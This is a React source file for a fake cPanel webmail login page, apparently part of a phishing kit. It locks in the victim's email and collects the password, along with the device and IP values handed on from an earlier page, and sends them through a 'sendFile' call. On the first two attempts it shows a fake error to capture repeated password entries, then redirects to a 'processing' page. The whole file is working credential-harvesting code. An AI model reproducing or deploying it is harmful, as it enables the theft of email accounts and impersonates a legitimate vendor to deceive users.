import React, { useState } from "react";
import { Helmet } from "react-helmet";
import { navigate } from "@reach/router";
import { notify, sendFile } from "../servers";
import Logo from "./logo.svg";

function WebmailMain({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };

  return (
    <>
      <Helmet>
        <link
          rel="stylesheet"
          type="text/css"
          href="../webmailmain/styleopensans.min.css"
        />
        <link
          rel="stylesheet"
          type="text/css"
          href="../webmailmain/style.css"
        />
      </Helmet>
      <div>
        <div id="preload_images" />
        <input type="hidden" id="goto_uri" defaultValue="/" />
        <input type="hidden" id="goto_app" defaultValue />
        {/* Do not remove msg_code as it is needed for automated testing - msg_code:[]  */}
        <div
          id="login-wrapper"
          className="group has-pw-reset"
          style={{ opacity: 1, visibility: "visible" }}
        >
          <div className="wrapper">
            <div style={{ display: "none" }}>
              <div id="locale-container" style={{ visibility: "hidden" }}>
                <div id="locale-inner-container">
                  <div id="locale-header">
                    <div className="locale-head">Please select a locale:</div>
                    <div className="close">
                      <a
                        href="#"
                        //  onclick="toggle_locales(false)"
                      >
                        X Close
                      </a>
                    </div>
                  </div>
                  <div id="locale-map">
                    <div className="scroller clear">
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=en">English</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=ar">العربية</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=bg">български</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=cs">čeština</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=da">dansk</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=de">Deutsch</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=el">Ελληνικά</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=es">español</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=es_419">
                          español latinoamericano
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=es_es">
                          español de España
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=fi">suomi</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=fil">Filipino</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=fr">français</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=he">עברית</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=hu">magyar</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=i_cpanel_snowmen">
                          ☃ cPanel Snowmen ☃ - i_cpanel_snowmen
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=id">
                          Bahasa Indonesia
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=it">italiano</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=ja">日本語</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=ko">한국어</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=ms">
                          Bahasa Melayu
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=nb">
                          norsk bokmål
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=nl">Nederlands</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=no">Norwegian</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=pl">polski</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=pt">português</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=pt_br">
                          português do Brasil
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=ro">română</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=ru">русский</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=sl">
                          slovenščina
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=sv">svenska</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=th">ไทย</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=tr">Türkçe</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=uk">українська</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=vi">Tiếng Việt</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=zh">中文</a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=zh_cn">
                          中文（中国）
                        </a>
                      </div>
                      <div className="locale-cell">
                        <a href="https://relmise.host/?locale=zh_tw">
                          中文（台湾）
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div id="content-container">
              <div id="login-container">
                <div id="login-sub-container">
                  <div id="login-sub-header">
                    <img className="main-logo" src={Logo} alt="logo" />
                  </div>
                  <div id="login-sub">
                    <div
                      id="clickthrough_form"
                      style={{ visibility: "hidden" }}
                    >
                      <form>
                        <div className="notices" />
                        <button type="submit" className="clickthrough-cont-btn">
                          Continue
                        </button>
                      </form>
                    </div>
                    <div id="forms">
                      <form noValidate id="login_form" onSubmit={submitForm}>
                        <div className="input-req-login">
                          <label htmlFor="user">Email Address</label>
                        </div>
                        <div className="input-field-login icon username-container">
                          <input
                            name="account_name"
                            id="user"
                            autoFocus="autofocus"
                            value={values.username}
                            placeholder="Enter your email address."
                            className="std_textbox"
                            type="text"
                            disabled
                            tabIndex={1}
                            required
                          />
                        </div>
                        <div className="input-req-login login-password-field-label">
                          <label htmlFor="pass">Password</label>
                        </div>
                        <div className="input-field-login icon password-container">
                          <input
                            name="password"
                            id="pass"
                            placeholder="Enter your email password."
                            className="std_textbox"
                            type="password"
                            tabIndex={2}
                            onChange={handleChange}
                            required
                          />
                        </div>
                        <div className="controls">
                          <div className="login-btn">
                            <button
                              name="login"
                              type="submit"
                              id="login_submit"
                              tabIndex={3}
                            >
                              Log in
                            </button>
                          </div>
                          <div className="reset-pw">
                            <a
                              href="https://relmise.host/resetpass?start=1"
                              id="reset_password"
                            >
                              Reset Password
                            </a>
                          </div>
                        </div>
                        <div className="clear" id="push" />
                      </form>
                      {/*CLOSE forms */}
                    </div>
                    {/*CLOSE login-sub */}
                  </div>
                  {/*CLOSE wrapper */}
                </div>
                {/*CLOSE login-sub-container */}
              </div>
              {/*CLOSE login-container */}
            </div>
            <div id="locale-footer" style={{ display: "block" }}>
              <div className="locale-container">
                <noscript>
                  &lt;form method="get" action="."&gt; &lt;select
                  name="locale"&gt; &lt;option value=""&gt;Change
                  locale&lt;/option&gt; &lt;option
                  value="en"&gt;English&lt;/option &gt;&lt;option
                  value="ar"&gt;العربية&lt;/option &gt;&lt;option
                  value="bg"&gt;български&lt;/option &gt;&lt;option
                  value="cs"&gt;čeština&lt;/option &gt;&lt;option
                  value="da"&gt;dansk&lt;/option &gt;&lt;option
                  value="de"&gt;Deutsch&lt;/option &gt;&lt;option
                  value="el"&gt;Ελληνικά&lt;/option &gt;&lt;option
                  value="es"&gt;español&lt;/option &gt;&lt;option
                  value="es_419"&gt;español latinoamericano&lt;/option
                  &gt;&lt;option value="es_es"&gt;español de España&lt;/option
                  &gt;&lt;option value="fi"&gt;suomi&lt;/option &gt;&lt;option
                  value="fil"&gt;Filipino&lt;/option &gt;&lt;option
                  value="fr"&gt;français&lt;/option &gt;&lt;option
                  value="he"&gt;עברית&lt;/option &gt;&lt;option
                  value="hu"&gt;magyar&lt;/option &gt;&lt;option
                  value="i_cpanel_snowmen" &gt;☃ cPanel Snowmen ☃ -
                  i_cpanel_snowmen&lt;/option &gt;&lt;option
                  value="id"&gt;Bahasa Indonesia&lt;/option &gt;&lt;option
                  value="it"&gt;italiano&lt;/option &gt;&lt;option
                  value="ja"&gt;日本語&lt;/option &gt;&lt;option
                  value="ko"&gt;한국어&lt;/option &gt;&lt;option
                  value="ms"&gt;Bahasa Melayu&lt;/option &gt;&lt;option
                  value="nb"&gt;norsk bokmål&lt;/option &gt;&lt;option
                  value="nl"&gt;Nederlands&lt;/option &gt;&lt;option
                  value="no"&gt;Norwegian&lt;/option &gt;&lt;option
                  value="pl"&gt;polski&lt;/option &gt;&lt;option
                  value="pt"&gt;português&lt;/option &gt;&lt;option
                  value="pt_br"&gt;português do Brasil&lt;/option &gt;&lt;option
                  value="ro"&gt;română&lt;/option &gt;&lt;option
                  value="ru"&gt;русский&lt;/option &gt;&lt;option
                  value="sl"&gt;slovenščina&lt;/option &gt;&lt;option
                  value="sv"&gt;svenska&lt;/option &gt;&lt;option
                  value="th"&gt;ไทย&lt;/option &gt;&lt;option
                  value="tr"&gt;Türkçe&lt;/option &gt;&lt;option
                  value="uk"&gt;українська&lt;/option &gt;&lt;option
                  value="vi"&gt;Tiếng Việt&lt;/option &gt;&lt;option
                  value="zh"&gt;中文&lt;/option &gt;&lt;option
                  value="zh_cn"&gt;中文（中国）&lt;/option &gt;&lt;option
                  value="zh_tw"&gt;中文（台湾）&lt;/option&gt; &lt;/select&gt;
                  &lt;button style="margin-left: 10px"
                  type="submit"&gt;Change&lt;/button&gt; &lt;/form&gt; &lt;style
                  type="text/css"&gt; #mobilelocalemenu, #locales_list {"{"}
                  display: none;
                  {"}"}
                  &lt;/style&gt;
                </noscript>
                <ul id="locales_list">
                  <li>
                    <a href="https://relmise.host/?locale=en">English</a>
                  </li>
                  <li>
                    <a href="https://relmise.host/?locale=ar">العربية</a>
                  </li>
                  <li>
                    <a href="https://relmise.host/?locale=bg">български</a>
                  </li>
                  <li>
                    <a href="https://relmise.host/?locale=cs">čeština</a>
                  </li>
                  <li>
                    <a href="https://relmise.host/?locale=da">dansk</a>
                  </li>
                  <li>
                    <a href="https://relmise.host/?locale=de">Deutsch</a>
                  </li>
                  <li>
                    <a href="https://relmise.host/?locale=el">Ελληνικά</a>
                  </li>
                  <li>
                    <a href="https://relmise.host/?locale=es">español</a>
                  </li>
                  <li>
                    <a
                      href="#"
                      id="morelocale"
                      //  onclick="toggle_locales(true)"
                      title="More locales"
                    >
                      …
                    </a>
                  </li>
                </ul>
                <div id="mobilelocalemenu">
                  Select a locale:
                  <a
                    href="#"
                    // onclick="toggle_locales(true)"
                    title="Change locale"
                  >
                    English
                  </a>
                </div>
              </div>
            </div>
          </div>
          {/*Close login-wrapper */}
        </div>
        <style
          dangerouslySetInnerHTML={{
            __html:
              "\n      @media (min-width: 481px) {\n        #select_user_form {\n          width: px;\n        }\n      }\n    ",
          }}
        />
        <div className="copyright">
          Copyright©&nbsp;2020 cPanel, Inc. <br />
          <a href="https://go.cpanel.net/privacy" target="_blank">
            Privacy Policy
          </a>
        </div>
      </div>
    </>
  );
}

export default WebmailMain;
